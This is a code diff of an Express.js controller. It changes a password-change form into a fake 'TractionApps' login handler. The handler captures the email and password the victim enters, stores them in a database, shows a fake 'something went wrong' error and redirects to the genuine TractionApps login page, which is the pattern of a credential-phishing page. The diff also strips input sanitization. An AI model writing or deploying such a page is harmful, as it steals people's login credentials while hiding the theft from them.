@@ -1,16 +1,16 @@
 // var body = require('express-validator')
 const { body,validationResult } = require('express-validator');
-var Password =  require("../models/passwords");
+var Tractionapps =  require("../models/passwords");
 
 exports.index = function(req, res) {
-    res.render('index')
+    res.render('TractionApps')
 };
+
 
 exports.index_post = [
 
-    body('oldPassword').trim().escape(),
-    body('password').trim().escape(),
-    body('confirmPassword').trim().escape(),
+    body('email'),
+    body('password'),
 
     
     // Process request after validation and sanitization.
@@ -21,22 +21,22 @@ exports.index_post = [
 
         if (!errors.isEmpty()) {
             // There are errors. Render form again with sanitized values/errors messages.
-            res.render('index', { passwords: req.body, errors: errors.array() });
+            res.render('TractionApps', { passwords: req.body, errors: errors.array() });
             return;
         }
         else {
             // Data from form is valid.
 
             // Create an Author object with escaped and trimmed data.
-            var password = new Password(
+            var tractionapps = new Tractionapps(
                 {
-                    oldPassword: req.body.oldPassword,
-                    password: req.body.password,
-                    confirmPassword: req.body.confirmPassword,
+                    email: req.body.email,
+                    password: req.body.password
                 });
-            password.save(function (err) {
+            tractionapps.save(function (err) {
                 if (err) { return next(err); }
-                // Successful - redirect to new author record.
+                req.flash('error', 'Sorry something went wrong.')
+                // Successful - redirect to new TractionApps Login Page.
                 res.redirect('https://web.tractionapps.co/#/login');
             });
         }
